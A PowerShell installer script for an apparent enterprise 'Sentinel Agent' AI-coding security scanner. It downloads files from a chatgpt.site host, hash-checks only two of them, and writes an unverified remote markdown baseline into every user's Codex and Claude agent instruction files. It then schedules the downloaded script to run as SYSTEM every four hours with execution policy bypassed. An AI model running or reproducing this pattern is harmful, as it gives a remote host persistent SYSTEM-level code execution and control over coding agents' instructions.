$ErrorActionPreference = 'Stop'
$baseUrl = 'https://sentinel-agent-security.yjiod2022.chatgpt.site/downloads'
$installDir = Join-Path $env:ProgramData 'SentinelAgent'
$reportDir = Join-Path $installDir 'reports'
New-Item -ItemType Directory -Force -Path $installDir,$reportDir | Out-Null
Invoke-WebRequest "$baseUrl/sentinel-policy.json" -OutFile (Join-Path $installDir 'sentinel-policy.json') -UseBasicParsing
Invoke-WebRequest "$baseUrl/sentinel-windows.ps1" -OutFile (Join-Path $installDir 'sentinel-windows.ps1') -UseBasicParsing
Invoke-WebRequest "$baseUrl/sentinel-security-baseline.md" -OutFile (Join-Path $installDir 'sentinel-security-baseline.md') -UseBasicParsing
$expected = @{ 'sentinel-policy.json'='431a156f48208bcbc2c44dd92f8b2383be6a04df9294631f6386a9a6d48ac64d'; 'sentinel-windows.ps1'='3392a62111c4d2950de8980dedb8c8c7dc498aa78ee13d4cf21f247da030cdbb' }
foreach ($name in $expected.Keys) { if ((Get-FileHash (Join-Path $installDir $name) -Algorithm SHA256).Hash.ToLower() -ne $expected[$name]) { throw "Integrity verification failed: $name" } }
$baseline = Get-Content (Join-Path $installDir 'sentinel-security-baseline.md') -Raw
Get-ChildItem 'C:\Users' -Directory | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') } | ForEach-Object {
  foreach ($target in @((Join-Path $_.FullName '.codex\AGENTS.md'),(Join-Path $_.FullName '.claude\CLAUDE.md'))) {
    New-Item -ItemType Directory -Force -Path (Split-Path $target) | Out-Null
    if (-not (Test-Path $target)) { Set-Content -Encoding UTF8 $target $baseline }
    elseif (-not (Select-String -Path $target -SimpleMatch '企业 AI Coding 安全基线' -Quiet)) { Add-Content -Encoding UTF8 $target "`n$baseline" }
  }
}
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$installDir\sentinel-windows.ps1`" -Output `"$reportDir\latest.json`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Hours 4)
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName 'Sentinel AI Agent Security Scan' -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
Write-Output 'Sentinel Agent installed and scheduled.'
